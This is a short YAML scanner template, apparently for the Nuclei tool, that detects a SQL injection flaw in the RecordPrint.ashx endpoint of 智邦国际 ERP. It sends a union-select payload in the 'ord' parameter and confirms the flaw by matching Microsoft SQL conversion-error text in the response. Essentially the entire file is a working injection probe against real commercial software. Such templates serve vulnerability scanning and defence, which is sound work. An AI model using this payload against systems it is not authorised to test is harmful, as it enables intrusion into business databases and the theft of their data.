id: zhibangguojiERP-RecordPrint_ashx-sql

info:
  name: 智邦国际ERP RecordPrint.ashx SQL注入漏洞
  author: xxx
  severity: high
  tags: sql injection

http:
  - raw:
      - |
        GET /SYSN/json/pcclient/RecordPrint.ashx?sort=1&ord=-1'%20union%20select%20@@version-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '在将 nvarchar 值'
          - '转换成数据类型 int 时失败'
          - 'Microsoft SQL'
        condition: and
      - type: status
        status: 
          - 200